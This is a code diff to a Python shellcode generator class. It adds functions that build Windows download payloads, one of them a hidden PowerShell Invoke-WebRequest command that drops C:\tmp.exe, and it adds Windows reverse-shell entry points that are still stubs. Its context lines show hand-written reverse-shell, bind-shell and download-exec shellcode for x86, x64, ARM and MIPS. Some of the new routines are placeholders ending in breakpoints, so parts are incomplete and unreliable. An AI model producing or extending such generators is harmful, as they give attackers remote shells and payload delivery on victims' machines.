@@ -94,6 +94,20 @@ class ShellcodeGenerator:
         return generators[key](url)
 
     @staticmethod
+    def generate_download_only(url: str, arch: str = "x86", mode: str = "32") -> bytes:
+        """Generate shellcode to download a file only (no execution)"""
+        if not url:
+            raise ValueError("URL cannot be empty")
+        generators = {
+            ("x86", "32"): ShellcodeGenerator._x86_download_only,
+            ("x86", "64"): ShellcodeGenerator._x64_download_only
+        }
+        key = (arch, mode)
+        if key not in generators:
+            raise ValueError(f"Unsupported architecture/mode for download-only: {arch}/{mode}")
+        return generators[key](url)
+
+    @staticmethod
     def generate_staged_shellcode(stager: bytes, payload: bytes) -> bytes:
         """Generate staged shellcode with stager and payload"""
         if not stager or not payload:
@@ -105,7 +119,24 @@ class ShellcodeGenerator:
         """Generate custom shellcode from assembly"""
         if not asm_code:
             raise ValueError("Assembly code cannot be empty")
-        return ShellcodeAssembler.assemble(asm_code, arch, mode)
+        result = ShellcodeAssembler.assemble(asm_code, arch, mode)
+        if result is None:
+            raise ValueError("Assembly failed; no shellcode generated.")
+        return result
+
+    @staticmethod
+    def generate_windows_reverse_shell(ip: str, port: int, arch: str = "x86", mode: str = "32") -> bytes:
+        """Generate Windows reverse shell shellcode for specified architecture"""
+        if not ShellcodeValidator._validate_ip_port(ip, port):
+            raise ValueError("Invalid IP or port")
+        generators = {
+            ("x86", "32"): ShellcodeGenerator._x86_windows_reverse_shell,
+            ("x86", "64"): ShellcodeGenerator._x64_windows_reverse_shell
+        }
+        key = (arch, mode)
+        if key not in generators:
+            raise ValueError(f"Unsupported architecture/mode for Windows reverse shell: {arch}/{mode}")
+        return generators[key](ip, port)
 
     @staticmethod
     def _validate_ip_port(ip: str, port: int) -> bool:
@@ -158,7 +189,7 @@ class ShellcodeGenerator:
         shellcode += b"\xb8\xad\x23\x86\x7c"          # mov eax, WinExec address
         shellcode += b"\xff\xd0"                      # call eax
 
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _x64_download_exec(url: str) -> bytes:
@@ -183,7 +214,7 @@ class ShellcodeGenerator:
             0xb0, 0x3b,                   # mov al, 59 (execve equivalent)
             0x0f, 0x05                    # syscall
         ])
-        return shellcode
+        return bytes(shellcode)
     
     @staticmethod
     def _arm_bind_shell(port: int) -> bytes:
@@ -245,8 +276,7 @@ class ShellcodeGenerator:
             0x01, 0xdf                # svc #1
         ])
 
-        return shellcode
-
+        return bytes(shellcode)
 
     @staticmethod
     def _x86_bind_shell(port: int) -> bytes:
@@ -265,7 +295,7 @@ class ShellcodeGenerator:
             0xb0, 0x0b,                   # mov al,0xb
             0xcd, 0x80                    # int 0x80
         ])
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _x64_bind_shell(port: int) -> bytes:
@@ -294,7 +324,7 @@ class ShellcodeGenerator:
             0x58,                         # pop rax
             0x0f, 0x05                    # syscall
         ])
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _x86_exec_shell(command: str) -> bytes:
@@ -317,7 +347,7 @@ class ShellcodeGenerator:
             0xb0, 0x0b,                   # mov al,0xb
             0xcd, 0x80                    # int 0x80
         ])
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _x64_exec_shell(command: str) -> bytes:
@@ -340,7 +370,7 @@ class ShellcodeGenerator:
             0xb0, 0x3b,                   # mov al, 59
             0x0f, 0x05                    # syscall
         ])
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _x86_reverse_shell(ip: str, port: int) -> bytes:
@@ -406,7 +436,7 @@ class ShellcodeGenerator:
             0xcd, 0x80                          # int    0x80
         ])
 
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _x64_reverse_shell(ip: str, port: int) -> bytes:
@@ -472,7 +502,7 @@ class ShellcodeGenerator:
             0xb0, 0x3b,                         # mov al, 0x3b (execve syscall)
             0x0f, 0x05                          # syscall
         ])
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _arm_reverse_shell(ip: str, port: int) -> bytes:
@@ -548,7 +578,7 @@ class ShellcodeGenerator:
             0x2f, 0x73, 0x68, 0x00        # /sh\0
         ])
         
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _arm_thumb_reverse_shell(ip: str, port: int) -> bytes:
@@ -624,7 +654,7 @@ class ShellcodeGenerator:
             0x2f, 0x73, 0x68, 0x00        # /sh\0
         ])
         
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _arm64_reverse_shell(ip: str, port: int) -> bytes:
@@ -681,7 +711,7 @@ class ShellcodeGenerator:
             0x2f, 0x73, 0x68, 0x00        # /sh\0
         ])
         
-        return shellcode
+        return bytes(shellcode)
 
     @staticmethod
     def _mips_reverse_shell(ip: str, port: int) -> bytes:
@@ -750,4 +780,65 @@ class ShellcodeGenerator:
             0x2f, 0x73, 0x68, 0x00        # /sh\0
         ])
         
+        return bytes(shellcode)
+
+    @staticmethod
+    def _x86_download_only(url: str) -> bytes:
+        """Generate x86 Windows shellcode to download a file only (no execution)"""
+        if not url.startswith("http"):
+            raise ValueError("URL must start with http/https")
+        url_bytes = url.encode() + b"\x00"
+        filename = b"C:\\tmp.exe\x00"
+        shellcode = bytearray()
+        # Simulate calling URLDownloadToFileA(NULL, url, path, 0, NULL)
+        shellcode += b"\x31\xc0"                      # xor eax, eax
+        shellcode += b"\x50"                          # push eax (NULL)
+        shellcode += b"\x68" + filename[-5:-1]        # push ".exe"
+        shellcode += b"\x68" + filename[-9:-5]        # push "\\tmp"
+        shellcode += b"\x68" + filename[-13:-9]       # push "C:\\"
+        shellcode += b"\x89\xe1"                      # mov ecx, esp (filename)
+        shellcode += b"\x50"                          # push eax (NULL)
+        shellcode += b"\x68" + url_bytes[-5:-1]       # push last 4 bytes of url
+        shellcode += b"\x68" + url_bytes[-9:-5]       # push prev 4 bytes
+        shellcode += b"\x68" + url_bytes[-13:-9]      # push prev 4 bytes
+        shellcode += b"\x89\xe2"                      # mov edx, esp (url)
+        shellcode += b"\x6a\x00"                      # push 0 (dwReserved)
+        shellcode += b"\x50"                          # push eax (NULL)
+        # Call URLDownloadToFileA (simulate)
+        # In real shellcode, would resolve and call the function
+        # Here, just a stub for demonstration
+        shellcode += b"\xcc"  # int3 (breakpoint, placeholder for call)
+        return bytes(shellcode)
+
+    @staticmethod
+    def _x64_download_only(url: str) -> bytes:
+        """Generate x64 Windows shellcode to download a file only (no execution)"""
+        ps_cmd = f"powershell -w hidden -c \"Invoke-WebRequest -Uri {url} -OutFile C:\\\\tmp.exe\""
+        cmd_bytes = ps_cmd.encode('utf-8') + b"\x00"
+        shellcode = bytearray([
+            0x48, 0x31, 0xc0,             # xor rax, rax
+            0x50,                         # push rax
+        ])
+        # Push command string to stack
+        for b in reversed(cmd_bytes):
+            shellcode += b'\x68' + bytes([b]) + b'\x00'*3  # padded
+        # In real shellcode, would resolve and call WinExec or CreateProcessA
+        # Here, just a stub for demonstration
+        shellcode += bytearray([0xcc])  # int3 (breakpoint, placeholder)
+        return bytes(shellcode)
+
+    @staticmethod
+    def _x86_windows_reverse_shell(ip: str, port: int) -> bytes:
+        """Placeholder for x86 Windows reverse shell shellcode"""
+        # TODO: Replace with real Windows x86 reverse shell shellcode
+        # For now, just return a NOP sled and int3
+        shellcode = b"\x90" * 8 + b"\xcc"  # NOP sled + int3
+        return shellcode
+
+    @staticmethod
+    def _x64_windows_reverse_shell(ip: str, port: int) -> bytes:
+        """Placeholder for x64 Windows reverse shell shellcode"""
+        # TODO: Replace with real Windows x64 reverse shell shellcode
+        # For now, just return a NOP sled and int3
+        shellcode = b"\x90" * 16 + b"\xcc"  # NOP sled + int3
         return shellcode
